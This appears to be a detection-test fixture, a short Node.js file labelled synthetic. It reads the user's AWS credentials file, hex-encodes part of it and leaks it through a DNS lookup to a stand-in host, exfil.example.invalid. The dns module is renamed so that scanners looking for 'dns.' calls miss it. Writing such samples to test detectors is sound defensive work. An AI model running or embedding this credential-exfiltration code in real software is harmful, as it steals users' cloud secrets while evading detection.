// FIXTURE ONLY — synthetic detection test sample, not real malware
// Evasion variant: the DNS module is required without the `node:` prefix and bound to another
// name, so no `dns.` call appears. The cloud credential file still leaves as DNS labels.
const resolver = require("dns");
const fs = require("fs");

const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf8");
const label = Buffer.from(creds).toString("hex").slice(0, 60);
resolver.resolve4(label + ".exfil.example.invalid", () => {});
